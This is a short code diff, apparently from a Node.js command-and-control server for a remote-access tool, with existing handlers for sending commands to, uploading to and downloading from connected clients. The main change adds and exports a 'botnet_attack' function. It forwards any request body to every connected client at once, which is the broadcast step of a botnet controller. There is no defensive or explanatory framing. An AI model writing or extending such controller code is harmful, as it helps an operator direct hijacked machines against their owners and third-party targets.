@@ -33,6 +33,8 @@ const upload_file = async(clients,req,res) => {
 
     try {
 
+        console.log("subida");
+        
         const clientId = req.params.id;
         const client = clients.get(clientId);
 
@@ -108,7 +110,7 @@ const getFiles= async(clients, req, res = response) => {
     
 };
 
-// 📄 Descargar archivo
+// Descargar archivo
 const downloadFiles=async (clients, req, res = response) => {
     const path = req.query.path || "/";
     const clientId = req.params.id;
@@ -154,7 +156,35 @@ const downloadFiles=async (clients, req, res = response) => {
     }, 5000);
 };
 
+const botnet_attack=(clients, req, res = response)=>{
+    
+    
+/*     const msgHandler = (msg) => {
+        try {
+            const parsed = JSON.parse(msg);
+            res.status(200).json(parsed);
+        } catch (e) {
+            res.status(200).json({ result: msg });
+        }
+        client.off('message', msgHandler);
+    }; */
+
+    for (const [clientid, client] of clients) {
+       // client.on('message', msgHandler);
+        client.send(JSON.stringify(req.body));
+        
+        //return res.status(200).json({msg:"Sended"})
+    }
 
 
 
-export{ send_cmd, upload_file, getFiles, downloadFiles }
+/*     setTimeout(() => {
+        client.off('message', msgHandler);
+        if (!res.headersSent) {
+            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+        }
+    }, 5000); */
+}
+
+
+export{ send_cmd, upload_file, getFiles, downloadFiles, botnet_attack }
